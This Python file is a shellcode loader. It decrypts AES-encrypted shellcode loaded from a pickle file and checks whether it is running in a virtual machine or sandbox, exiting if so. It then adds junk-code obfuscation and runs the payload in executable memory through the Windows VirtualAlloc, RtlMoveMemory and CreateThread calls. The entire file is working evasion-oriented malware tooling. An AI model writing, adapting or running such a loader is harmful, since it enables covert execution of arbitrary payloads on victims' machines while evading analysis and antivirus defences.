import ctypes
import pickle
import base64
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives.padding import PKCS7
import vm_check
import obfuscation


with open('keywords.txt', 'r') as f:
    key = base64.b64decode(f.readline().strip())
    iv = base64.b64decode(f.readline().strip())

with open('encrypted_shellcode.pkl', 'rb') as f:
    B64EnShellcode = pickle.load(f)

encrypted_shellcode = base64.b64decode(B64EnShellcode)

cipher = Cipher(algorithms.AES(key), modes.CBC(iv), backend=default_backend())
decryptor = cipher.decryptor()
unpadder = PKCS7(algorithms.AES.block_size).unpadder()

decrypted_padded_shellcode = decryptor.update(encrypted_shellcode) + decryptor.finalize()
shellcode = unpadder.update(decrypted_padded_shellcode) + unpadder.finalize()

r = vm_check.numberOfCPU() + vm_check.physicalMemory() + vm_check.check_virtual() + vm_check.check_file()
if r < 4 or vm_check.is_sandbox():  # 判断是否为虚拟机
    exit()
else:
    obfuscation.addTrash()

    sc = b'\x90' * 16 + shellcode
    ctypes.windll.kernel32.VirtualAlloc.restype = ctypes.c_uint64
    rusage = ctypes.windll.kernel32.VirtualAlloc(0, len(sc), 0x3000, 0x40)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_uint64(rusage), ctypes.create_string_buffer(sc), len(sc))
    handle = ctypes.windll.kernel32.CreateThread(0, 0, ctypes.c_uint64(rusage), 0, 0, 0)
    ctypes.windll.kernel32.WaitForSingleObject(handle, -1)

    obfuscation.addTrash()
